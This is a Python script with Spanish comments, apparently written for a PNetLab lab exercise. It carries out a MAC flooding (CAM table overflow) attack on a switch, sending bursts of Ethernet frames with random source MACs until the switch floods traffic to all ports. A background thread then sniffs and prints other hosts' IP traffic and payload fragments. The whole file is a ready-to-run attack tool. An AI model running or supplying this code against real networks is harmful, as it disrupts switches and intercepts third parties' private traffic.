import os
import sys
import time
import random
import signal
import threading
from scapy.all import Ether, sendp, conf, sniff, IP, TCP, UDP, Raw
 
# ──────────────────────────────────────────────
# CONFIGURACIÓN
# ──────────────────────────────────────────────
IFACE        = "ens3"
ATTACKER_MAC = "50:76:9b:00:05:00"
PACKET_BURST = 1000          # paquetes por ráfaga
BURST_DELAY  = 0.001         # segundos entre paquetes dentro de la ráfaga
TARGET_MAC   = "ff:ff:ff:ff:ff:ff"  # broadcast como destino (llega a todos)
SNIFF_AFTER  = True          # intentar sniffear cuando el switch haga flood
VICTIM_IP    = "10.6.82.11"  # IP a monitorear en la fase de sniff
 
# ──────────────────────────────────────────────
# GENERADORES
# ──────────────────────────────────────────────
 
def random_mac() -> str:
    """MAC aleatoria, unicast, localmente administrada."""
    mac = [random.randint(0, 0xFF) for _ in range(6)]
    mac[0] = (mac[0] & 0xFE) | 0x02   # bit U/L=1, bit I/G=0
    return ":".join(f"{b:02x}" for b in mac)
 
 
def build_flood_frame(src_mac: str) -> bytes:
    """
    Frame Ethernet mínimo con MAC origen aleatoria.
    El contenido es irrelevante; lo importante es que
    el switch registre src_mac en su tabla CAM.
    """
    pkt = Ether(
        src=src_mac,
        dst=TARGET_MAC,
        type=0x0800,           # IPv4 tipo para no ser filtrado
    ) / (b'\x00' * 20)        # payload mínimo
    return bytes(pkt)
 
 
# ──────────────────────────────────────────────
# SNIFF PASIVO (post-flooding)
# ──────────────────────────────────────────────
 
sniff_active = threading.Event()
captured     = []
captured_lock= threading.Lock()
 
 
def passive_sniff():
    """
    Una vez el switch está en modo HUB, captura tráfico
    que no va dirigido al atacante (víctima ↔ otros hosts).
    """
    print("\n  [SNIFF] Modo escucha activo — capturando tráfico ajeno...")
 
    def process(pkt):
        if not sniff_active.is_set():
            return
        if IP not in pkt:
            return
        src = pkt[IP].src
        dst = pkt[IP].dst
        # Ignorar tráfico propio del atacante
        if src == "10.0.137.50":
            return
        proto = "TCP" if TCP in pkt else "UDP" if UDP in pkt else "IP"
        payload = ""
        if Raw in pkt:
            try:
                raw_data = pkt[Raw].load
                payload = raw_data[:60].decode("utf-8", errors="replace").replace("\n", "\\n")
            except Exception:
                payload = raw_data[:30].hex()
 
        with captured_lock:
            captured.append((src, dst, proto, payload))
            idx = len(captured)
 
        ts = time.strftime("%H:%M:%S")
        print(f"  [SNIFF #{idx:>4}] {ts}  {src:<15} → {dst:<15}  [{proto}]  {payload[:50]}")
 
    sniff(
        iface=IFACE,
        filter="ip",
        prn=process,
        store=False,
        stop_filter=lambda p: not sniff_active.is_set(),
    )
 
 
# ──────────────────────────────────────────────
# FASE 1: FLOOD CAM TABLE
# ──────────────────────────────────────────────
 
stop_event = threading.Event()
 
 
def flood_cam():
    """Envía frames con MACs origen aleatorias en ráfagas."""
    sent   = 0
    start  = time.time()
 
    print("  [FLOOD] Iniciando inundación de tabla CAM...")
    print(f"  [FLOOD] Ráfagas de {PACKET_BURST} frames / {BURST_DELAY}s entre frames\n")
 
    while not stop_event.is_set():
        batch = []
        for _ in range(PACKET_BURST):
            if stop_event.is_set():
                break
            src_mac = random_mac()
            batch.append(Ether(src=src_mac, dst=TARGET_MAC, type=0x0800) / (b'\x00' * 20))
 
        sendp(batch, iface=IFACE, verbose=0, inter=BURST_DELAY)
        sent += len(batch)
 
        elapsed = time.time() - start
        pps = sent / elapsed if elapsed > 0 else 0
        print(
            f"  [FLOOD] MACs inyectadas: {sent:>7} | "
            f"Velocidad: {pps:>8.0f} pkt/s | "
            f"Tiempo: {elapsed:>5.1f}s",
            end="\r"
        )
 
        # Después de 5000 frames, activar sniff (switch probablemente ya en modo HUB)
        if sent >= 5000 and SNIFF_AFTER and not sniff_active.is_set():
            sniff_active.set()
 
    return sent, time.time() - start
 
 
# ──────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────
 
def run_mac_flooding():
    if os.geteuid() != 0:
        print("[!] Ejecutar con sudo"); sys.exit(1)
 
    print("=" * 60)
    print("  MAC FLOODING (CAM Overflow) — Laboratorio PNetLab")
    print("=" * 60)
    print(f"  Interfaz     : {IFACE}")
    print(f"  MAC atacante : {ATTACKER_MAC}")
    print(f"  Destino      : {TARGET_MAC}  (broadcast)")
    print(f"  Sniff post-flood: {'Sí' if SNIFF_AFTER else 'No'}")
    print("=" * 60)
    print("  Ctrl+C para detener\n")
 
    def on_exit(sig, frame):
        stop_event.set()
        sniff_active.clear()
        with captured_lock:
            total_cap = len(captured)
        print(f"\n\n  [+] Ataque detenido.")
        print(f"  [+] Paquetes ajenos capturados: {total_cap}")
        if total_cap > 0:
            print(f"  [+] Último capturado: {captured[-1][0]} → {captured[-1][1]}")
        print("  [+] Saliendo.\n")
        sys.exit(0)
 
    signal.signal(signal.SIGINT, on_exit)
 
    # Arrancar sniff en background (se activa solo cuando el switch llega a límite)
    if SNIFF_AFTER:
        sniff_t = threading.Thread(target=passive_sniff, daemon=True)
        sniff_t.start()
 
    # Flood
    flood_cam()
 
 
if __name__ == "__main__":
    run_mac_flooding()
